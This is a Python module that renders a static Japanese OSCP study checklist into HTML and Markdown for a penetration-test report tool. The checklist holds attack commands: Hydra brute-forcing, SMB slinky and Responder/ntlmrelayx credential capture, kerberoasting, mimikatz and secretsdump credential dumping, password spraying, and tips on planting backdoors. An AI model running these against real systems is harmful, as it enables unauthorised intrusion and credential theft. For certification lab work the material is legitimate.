"""Shared OSCP checklist (Japanese) embedded in every proxenum report.

Purely cosmetic: the checklist text is static and identical across scan / focus /
drill / adenum reports. Each item is a native checkbox (check off, no JS needed)
whose label is an expandable <details> revealing a concrete command/hint.

Exposes:
  checklist_html()  → self-contained HTML block (own <style>, no external deps)
  checklist_md()    → markdown version for the "Copy Markdown" button
"""
from __future__ import annotations


def _esc(s: str) -> str:
    return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ── checklist data ────────────────────────────────────────────────────────────
# Structure: list of (category, [ (subsection_or_"", [ (item_text, command/hint) ]) ])
# An empty command renders as a dimmed hint with no code block.

_CHECKLIST: list = [
    ("🐧 初期侵入", [
        ("AnyTime", [
            ("謎のエラーや謎の文字列はワンチャンにかけてググってみる",
             "# エラー文・バナー・バージョン文字列をそのまま検索エンジンへ"),
            ("メタデータを解析してみる",
             "exiftool <file>\nstrings <file>"),
            ("一旦実行してみるかぁ",
             "# 取得したバイナリ/スクリプトを安全な環境で一度実行してみる"),
        ]),
        ("全般 — ポート", [
            ("smb — 書き込み可能なら nxc slinky を仕掛けてみる",
             "nxc smb <IP> -u <user> -p <pass> -M slinky -o SERVER=<LHOST> NAME=docs"),
            ("Unknown ポートに対してブラウザで http アクセスを試した？",
             "# ブラウザで http://<IP>:<port>/ と https://<IP>:<port>/ を開く"),
            ("Unknown ポートを「$port/tcp open unknown vuln」で検索した？",
             "# 検索クエリ例: \"<port>/tcp open unknown\" exploit"),
            ("ユーザー名が一つでもあるなら Hydra で ftp / ssh ログイン試行？",
             "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP>\n"
             "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP>"),
            ("admin/admin とサービスの default credential でログイン試行？",
             "# 各サービスの既定資格情報を試す（admin:admin, root:root, sa:空 等）"),
            ("UDP を忘れてない？",
             "sudo nmap -sU --top-ports 50 <IP>"),
            ("再度手動でポートスキャンしてみる？",
             "sudo nmap -p- --min-rate 1000 -Pn <IP>\nsudo nmap -sCV -p<ports> <IP>"),
        ]),
        ("全般 — ウェブサイト", [
            ("Feroxbuster で common.txt を試行した？",
             "feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt"),
            ("Feroxbuster で big.txt を試行した？",
             "feroxbuster -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/big.txt"),
            ("php で動くなら -x php を付けて試行した？",
             "feroxbuster -u http://<IP> -x php,txt,html "
             "-w /usr/share/seclists/Discovery/Web-Content/common.txt"),
            ("「search」等のディレクトリがあればパラメータブルートフォース？",
             "ffuf -u 'http://<IP>/search?FUZZ=test' "
             "-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>"),
            ("怪しい API 系のページがあるなら Caido で POST 試行？",
             "# Caido / Burp Repeater で POST・メソッド変更・JSON を試す"),
            ("ドメイン名が判明しているなら vhost 探索を試す？",
             "ffuf -u http://<IP> -H 'Host: FUZZ.<domain>' "
             "-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>"),
            ("ソースコードを読んでみる？",
             "# ページソース・読み込まれる JS・HTML コメントを確認 (Ctrl+U)"),
            ("robots.txt を読んでみる？",
             "curl -s http://<IP>/robots.txt"),
        ]),
        ("Windows — ポート", [
            ("snmp と smtp を見間違えて列挙漏れしてるかも？",
             "# 161/udp(snmp) と 25/tcp(smtp) を取り違えていないか再確認\n"
             "snmpwalk -v2c -c public <IP>"),
        ]),
        ("Windows — ウェブサイト", [
            ("davtest で webdav の書き込みを試行した？",
             "davtest -url http://<IP>"),
            ("入手したユーザ情報で webdav に書き込めるかも？",
             "davtest -url http://<IP> -auth <user>:<pass>\ncadaver http://<IP>"),
        ]),
    ]),

    ("🐧 権限昇格", [
        ("全般", [
            ("同じログインパスワードでログイン試行した？",
             "su - <user>\n# 既知パスワードの使い回しを全ユーザ・全サービスで試す"),
            ("内部ポートで怪しいサービスは動いていない？",
             "ss -tlnp\nnetstat -ano   # (Windows)"),
            ("変な自作バイナリファイルは一旦実行してみる？",
             "strings <bin>\n./<bin>"),
            ("smb とか ftp にパスワードは落ちてない？",
             "# 共有・設定ファイル・スクリプトから平文認証情報を grep"),
        ]),
        ("Linux", [
            ("lse.sh を試した？", "./lse.sh -l1 -i"),
            ("linpeas.sh（黄色文字のみ）を試した？", "./linpeas.sh | tee linpeas.txt"),
            ("linux-exploit-suggester.sh を試した？", "./linux-exploit-suggester.sh"),
            ("pspy は試した？", "./pspy64 -pf -i 1000"),
            ("履歴ファイルは読んだ？",
             "cat ~/.bash_history\nfind / -name '*_history' 2>/dev/null"),
        ]),
        ("Windows", [
            ("PE-Audit.ps1 を試した？", ". .\\PowerUp.ps1; Invoke-AllChecks"),
            ("PrivescCheck.ps1 を試した？", ". .\\PrivescCheck.ps1; Invoke-PrivescCheck"),
            ("Winpeas.exe は試した？", ".\\winPEASx64.exe"),
            ("C:\\ ドライブ以下を確認した？", "dir C:\\ /a"),
            ("tree /f /a C:\\Users を試した？", "tree /f /a C:\\Users"),
            ("履歴ファイルは読んだ？",
             "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"),
            ("アーキテクチャを再度確認してみる？",
             "systeminfo | findstr /B /C:\"System Type\""),
            ("インストールされているアプリに脆弱性があるかも？",
             "wmic product get name,version"),
        ]),
    ]),

    ("🏰 AD (Active Directory)", [
        ("初期侵入", [
            ("SMB に書き込み可能ならば Responder を試してみる？",
             "responder -I tun0\nimpacket-ntlmrelayx -tf targets.txt -smb2support"),
            ("ユーザー名を一つでも知ってるなら AS-REP Roasting を試す？",
             "impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <DC> -format hashcat"),
            ("smb rid brute でユーザー名列挙してみる？",
             "nxc smb <DC> -u guest -p '' --rid-brute"),
            ("ldap --users でユーザー名列挙した？",
             "nxc ldap <DC> -u <user> -p <pass> --users"),
            ("kerbrute でユーザー名列挙してみる？",
             "kerbrute userenum -d <domain> --dc <DC> "
             "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"),
            ("匿名の ldapsearch を試した？",
             "ldapsearch -H ldap://<DC> -x -b \"DC=<dc>,DC=<dc>\""),
        ]),
        ("ラテラルムーブメント", [
            ("管理者権限取得後にも PE-Audit / tree /f /a C:\\Users を試した？",
             ". .\\PowerUp.ps1; Invoke-AllChecks\ntree /f /a C:\\Users"),
            ("管理者として読める履歴ファイルは全部読んだ？ windows.old は？",
             "# 全ユーザの履歴・C:\\ 直下の windows.old 等の機密フォルダを確認"),
            ("管理者権限を取らなくとも横移動できない？",
             "nxc smb <IP> -u <user> -p <pass>   # 別ホストへ既知cred"),
            ("ldapdomaindump でユーザーの説明を読んでみた？",
             "ldapdomaindump -u '<domain>\\<user>' -p <pass> <DC> -o ldapbooks"),
            ("kerberoasting を試行した？",
             "nxc ldap <DC> -u <user> -p <pass> --kerberoasting kerb.hash"),
            ("mimikatz を実行した？",
             "# privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam"),
            ("regsave (secretsdump) を実行した？",
             "impacket-secretsdump <domain>/<user>:<pass>@<IP>"),
            ("既知のユーザー名/パスワード/NTLM/秘密鍵の使い回しを試した？",
             "nxc smb <subnet>/24 -u users.txt -p pass.txt --no-brute --continue-on-success"),
        ]),
    ]),
]

# ── はてな (troubleshooting notes — dismissable) ──────────────────────────────
_HATENA: list = [
    ("🔥 リバースシェルが取れない", [
        "パッチが当たってるかも",
        "消えても大丈夫ならマシンをリブート（証拠写真を撮っていれば大丈夫）",
        "消したくないなら VPN を再スタート",
        "可能なら一旦 tcpdump で疎通を確認 (sudo tcpdump -i tun0 icmp)",
        "ポートを 21 / 80 / 443・相手が使ってるポートに変えてみる",
        "「-e」やシェル種別・「-s」フラグを外してみる",
        "ターゲット OS にふさわしいリバースシェルか確認",
        "一旦相手に保存して実行させられる？",
        "管理者シェルならバックドア（グループ追加・SUID 設定）を設置",
        "ピボッティングの問題かも",
    ]),
    ("🔥 Exploit が動かない", [
        "パッチが当たってる可能性",
        "ほかの人の exploit を試してみる",
        "sleep を挟んでみる",
        "エラー内容を検索してみる",
        "脆弱性の仕組み（BoF やカーネル系か）を調べる",
        "metasploit にモジュールがないか探す",
        "アーキテクチャが違うかも",
    ]),
]


# ── renderers ─────────────────────────────────────────────────────────────────

_STYLE = """
<style>
.oscp-cl{font-size:13px}
.oscp-cl .oscp-cat{margin:18px 0 6px;font-size:15px;font-weight:700;color:var(--accent-gold,#c9a96e)}
.oscp-cl .oscp-sub{margin:12px 0 4px 2px;font-size:12px;font-weight:600;color:var(--accent-sage,#7aab7a);
  border-left:3px solid var(--accent-sage,#7aab7a);padding-left:8px}
.oscp-cl .oscp-item{display:flex;gap:8px;align-items:flex-start;padding:3px 0 3px 6px}
.oscp-cl .oscp-cb{margin-top:4px;flex-shrink:0;width:14px;height:14px;cursor:pointer}
.oscp-cl .oscp-det{flex:1;min-width:0}
.oscp-cl .oscp-det>summary{cursor:pointer;list-style:none;color:var(--text-secondary,#c0c8d4);line-height:1.5}
.oscp-cl .oscp-det>summary::-webkit-details-marker{display:none}
.oscp-cl .oscp-det>summary::before{content:'▸ ';color:var(--text-muted,#8b949e)}
.oscp-cl .oscp-det[open]>summary::before{content:'▾ '}
.oscp-cl .oscp-cb:checked ~ .oscp-det>summary{text-decoration:line-through;opacity:.45}
.oscp-cl pre.oscp-cmd{margin:5px 0 8px;padding:8px 11px;background:var(--bg-code,#161b22);
  border-radius:6px;font-family:var(--font-mono,monospace);font-size:11.5px;color:var(--accent-sage,#7aab7a);
  white-space:pre-wrap;overflow-x:auto;border:1px solid var(--border,#30363d)}
.oscp-cl .oscp-hint{margin:4px 0 6px;font-size:11px;color:var(--text-muted,#8b949e);font-style:italic}
.oscp-cl .oscp-hatena{margin:10px 0;border:1px solid #f0883e44;border-radius:8px;background:#f0883e10;padding:8px 12px}
.oscp-cl .oscp-hatena h4{margin:0 0 4px;color:#f0883e;font-size:13px;display:flex;justify-content:space-between}
.oscp-cl .oscp-hatena ul{margin:4px 0 0 16px;color:var(--text-secondary,#c0c8d4);font-size:12px;line-height:1.7}
.oscp-cl .oscp-x{cursor:pointer;color:var(--text-muted,#8b949e);font-weight:400;border:none;background:none}
</style>
"""


def checklist_html() -> str:
    parts: list[str] = [_STYLE, '<div class="oscp-cl">']
    for cat, subs in _CHECKLIST:
        parts.append(f'<div class="oscp-cat">{_esc(cat)}</div>')
        for sub, items in subs:
            if sub:
                parts.append(f'<div class="oscp-sub">{_esc(sub)}</div>')
            for text, cmd in items:
                cmd = (cmd or "").strip()
                if cmd.startswith("#") and "\n" not in cmd:
                    body = f'<div class="oscp-hint">{_esc(cmd.lstrip("# ").strip())}</div>'
                elif cmd:
                    body = f'<pre class="oscp-cmd">{_esc(cmd)}</pre>'
                else:
                    body = ""
                parts.append(
                    '<div class="oscp-item">'
                    '<input type="checkbox" class="oscp-cb">'
                    '<details class="oscp-det"><summary>'
                    f'{_esc(text)}</summary>{body}</details>'
                    '</div>'
                )
    # はてな (dismissable troubleshooting)
    parts.append('<div class="oscp-cat">❓ はてな</div>')
    for i, (title, bullets) in enumerate(_HATENA):
        lis = "".join(f'<li>{_esc(b)}</li>' for b in bullets)
        parts.append(
            f'<div class="oscp-hatena" id="oscp-hatena-{i}">'
            f'<h4>{_esc(title)}'
            f'<button class="oscp-x" onclick="this.closest(\'.oscp-hatena\').remove()" '
            f'title="消去">✕</button></h4>'
            f'<ul>{lis}</ul></div>'
        )
    parts.append('</div>')
    return "".join(parts)


def checklist_md() -> str:
    lines: list[str] = []
    for cat, subs in _CHECKLIST:
        lines.append(f"# {cat}")
        for sub, items in subs:
            if sub:
                lines.append(f"## {sub}")
            for text, cmd in items:
                lines.append(f"- [ ] {text}")
                cmd = (cmd or "").strip()
                if cmd and not (cmd.startswith("#") and "\n" not in cmd):
                    for cl in cmd.splitlines():
                        lines.append(f"      {cl}")
            lines.append("")
    for title, bullets in _HATENA:
        lines.append(f"> {title}")
        for b in bullets:
            lines.append(f"  * {b}")
        lines.append("")
    return "\n".join(lines)
